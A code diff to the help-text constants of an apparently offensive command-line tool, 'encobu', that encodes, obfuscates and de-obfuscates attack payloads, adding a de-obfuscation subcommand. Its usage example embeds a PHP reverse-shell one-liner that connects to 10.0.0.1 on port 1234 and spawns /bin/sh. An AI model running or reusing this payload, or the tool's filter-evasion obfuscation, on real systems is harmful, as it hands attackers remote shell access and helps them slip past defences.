@@ -67,7 +67,7 @@ class ObfusSubCommand:
 
     POLY_HELP = "Enables polymorphic escaping for escape-sequence algorithm"
 
-class DecodingCommand:
+class DecodingSubCommand:
     DESCRIPTION = "Decodes a given payload or a file using standard decoding methods"
     HELP = "Decodes a given payload or file using specified method"
     EPILOG = """
@@ -92,3 +92,29 @@ class DecodingCommand:
     KEY_HELP = "The encryption key is required when the method is XOR"
     KEY_METAVAR = "<SECRET_KEY>"
 
+class DeobfusSubCommand:
+    DESCRIPTION = "De-obfuscates the payload using string manipulation and de-obfuscation algorithms"
+    HELP = "De-obfuscate your payload using specific algorithms"
+    EPILOG = """
+    EXAMPLES:
+        encobu deobfus -P "php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'" -a rci
+        encobu deobfus -F hack.txt -a rci
+    """
+
+    PAYLOAD_HELP = "The payload you want to de-obfuscate using different algorithms"
+    PAYLOAD_METAVAR = "<PAYLOAD>"
+
+    FILE_HELP = "The file you want to de-obfuscate using different algorithms"
+    FILE_METAVAR = "<FILE>"
+
+    ALGO_HELP = "The de-obfuscation algorithm to use (choices: %(choices)s)"
+    ALGO_METAVAR = "<ALGORITHM>"
+
+    STRIDE_HELP = "Step size for character insertion (default: %(default)s)"
+    STRIDE_METAVAR = "<STRIDE>"
+
+    NOISE_LEN_HELP = "Number of characters to be inserted (default: %(default)s)"
+    NOISE_LEN_METAVAR = "<NOISE_LENGTH>"
+
+    OPERATOR_HELP = "Concatenation operator to be used with split and concatenation algorithm (default: %(default)s)"
+    OPERATOR_METAVAR = "<OPERATOR>"
